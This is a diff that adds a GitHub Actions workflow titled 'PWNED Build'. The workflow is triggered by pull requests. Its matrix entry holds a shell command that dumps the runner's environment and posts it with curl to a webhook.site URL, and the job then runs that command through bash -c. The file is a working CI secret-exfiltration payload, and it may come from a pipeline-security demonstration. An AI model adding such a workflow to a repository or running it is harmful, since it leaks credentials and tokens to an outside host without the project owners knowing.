@@ -1,0 +1,18 @@
+name: PWNED Build
+
+on:
+  pull_request:
+
+jobs:
+  malicious-job:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        target: [
+          "echo '🔥 Exploiting CI'; env | curl -X POST -d @- https://webhook.site/626216cd-def2-43f4-b42a-72e8a8cc088e"
+        ]
+    steps:
+      - name: Malicious Execution
+        run: |
+          echo "Target command: ${{ matrix.target }}"
+          bash -c "${{ matrix.target }}"
